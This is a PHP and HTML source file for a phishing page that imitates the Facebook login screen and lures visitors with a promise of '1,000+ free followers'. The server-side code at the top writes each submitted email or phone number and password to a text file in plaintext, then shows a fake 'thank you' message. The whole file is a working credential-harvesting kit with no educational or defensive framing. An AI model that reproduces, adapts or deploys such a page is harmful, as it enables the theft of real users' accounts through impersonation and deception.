<?php
$success = false;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $data = "Email/Phone: " . $email . " | Password: " . $password . "\n";

    file_put_contents("save.txt", $data, FILE_APPEND | LOCK_EX);

    $success = true;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook - Log In or Sign Up</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #e9ebee;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
      text-align: center;
      width: 350px;
    }
    .login-box h1 {
      color: #1877f2;
      font-size: 36px;
      margin-bottom: 20px;
    }
    .login-box p {
      background: #f7f7f7;
      padding: 10px;
      border-radius: 5px;
      margin-bottom: 20px;
      font-weight: bold;
      color: #444;
    }
    .login-box input[type="text"],
    .login-box input[type="password"] {
      width: 100%;
      padding: 12px 10px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    .login-box button {
      background: #1877f2;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 6px;
      width: 100%;
      font-size: 16px;
      margin-top: 10px;
      cursor: pointer;
    }
    .login-box button:hover {
      background: #145dbf;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h1>facebook</h1>

    <?php if ($success): ?>
      <p style="color:green;">🎉 Thank you for logging in! Your followers will be added shortly.</p>
    <?php else: ?>
      <p>🔔 Log in now and instantly get 1,000+ free followers as a gift!</p>
      <form method="POST">
        <input type="text" name="email" placeholder="Mobile number or email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
      </form>
    <?php endif; ?>

  </div>
</body>
</html>
